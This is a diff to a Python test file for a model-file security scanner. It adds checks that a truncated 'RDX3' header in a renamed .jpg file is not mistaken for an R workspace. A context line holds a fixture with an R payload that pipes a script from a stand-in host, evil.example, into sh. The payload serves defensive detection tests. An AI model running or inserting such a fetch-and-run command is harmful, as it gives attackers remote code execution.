@@ -441,6 +441,7 @@ def test_core_routes_renamed_r_workspace_and_preserves_malicious_findings(tmp_pa
 
     assert detect_file_format(str(path)) == "r_serialized"
     assert detect_file_format_for_skip_filter(str(path)) == "r_serialized"
+    assert RSerializedScanner.can_handle(str(path))
     assert direct.scanner_name == "r_serialized"
     assert _check_by_name(direct, "Executable Symbol Context Analysis")[0].severity == IssueSeverity.CRITICAL
     assert _check_by_name(direct, "Serialized Expression Payload Detection")[0].severity == IssueSeverity.CRITICAL
@@ -453,6 +454,8 @@ def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_ma
     _write_raw_r_serialized(benign_workspace, "workspace\nmodel_one\nmodel_two", workspace_header=True)
     ambiguous_text = tmp_path / "notes.jpg"
     ambiguous_text.write_bytes(b"X\nordinary exported table\n")
+    incomplete_workspace = tmp_path / "header-notes.jpg"
+    incomplete_workspace.write_bytes(b"RDX3\nQ\nordinary exported table\n")
 
     direct = core.scan_file(str(benign_workspace), config={"cache_enabled": False})
     aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)
@@ -461,6 +464,8 @@ def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_ma
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
     assert detect_file_format_for_skip_filter(str(ambiguous_text)) == "unknown"
     assert str(ambiguous_text) not in aggregate.file_metadata
+    assert detect_file_format_for_skip_filter(str(incomplete_workspace)) == "unknown"
+    assert str(incomplete_workspace) not in aggregate.file_metadata
     assert core.determine_exit_code(aggregate) == 0
 
 
@@ -472,6 +477,7 @@ def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_matc
             b"RDX3\nX\nexpression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
         )
         archive.writestr("notes.jpg", b"X\nordinary exported table\n")
+        archive.writestr("header-notes.jpg", b"RDX3\nQ\nordinary exported table\n")
 
     result = core.scan_file(str(archive_path), config={"cache_enabled": False})
 
@@ -480,3 +486,4 @@ def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_matc
         issue.severity == IssueSeverity.CRITICAL and "payload.jpg" in (issue.location or "") for issue in result.issues
     )
     assert not any("notes.jpg" in (issue.location or "") for issue in result.issues)
+    assert not any("header-notes.jpg" in (issue.location or "") for issue in result.issues)
